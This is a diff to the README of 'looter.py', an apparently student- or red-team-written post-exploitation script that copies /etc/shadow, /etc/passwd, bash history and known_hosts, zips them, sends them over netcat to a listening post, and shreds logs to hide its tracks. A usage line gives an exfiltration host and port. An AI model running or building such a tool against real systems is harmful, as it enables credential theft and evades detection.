@@ -5,7 +5,7 @@ On the 842 Ideas Spreadsheet, Andrew Kramer suggested the idea of creating an au
 ##Purpose
 This script will crawl through a box and quickly collect useful information for an attacker.  The script will determine which OS it is on to ensure compatibility before attempting to collect anything.  The nest egg (collection stash) location will be in the present working directory of the script unless specified by the user.
 
-This script makes an attempt is made to copy relevant files including but not limited to /etc/passwd, /etc/shadow, ~/.bash_history, etc to the nest egg location.  Once everything is collected, the files are prepared and zipped for exfiltration.  Currently, the script uses netcat to create a network connection to a listening post for exfiltration.
+This script makes an attempt is made to copy relevant files including but not limited to /etc/passwd, /etc/shadow, ~/.bash_history, known_hosts etc to the nest egg location.  Once everything is collected, the files are prepared and zipped for exfiltration.  Currently, the script uses netcat to create a network connection to a listening post for exfiltration.
 
 The goal is to be discreet and the script will shred logs, avoid writing to bash_history, and cover its own tracks after performing collections.
 
@@ -54,7 +54,6 @@ python ./looter.py -a -t 10.0.0.1 -p 1234 -d ~/Desktop/
 
 ##Known Issues
 * Random bug where user specified path sometimes causes zipping to fail
-* Clean up collection of ~/.ssh/ file (currently throws everything into single folder with everything else)
 * Not sure how "discreet" the script is yet, plenty of room for improvement
 
 ##Future Work
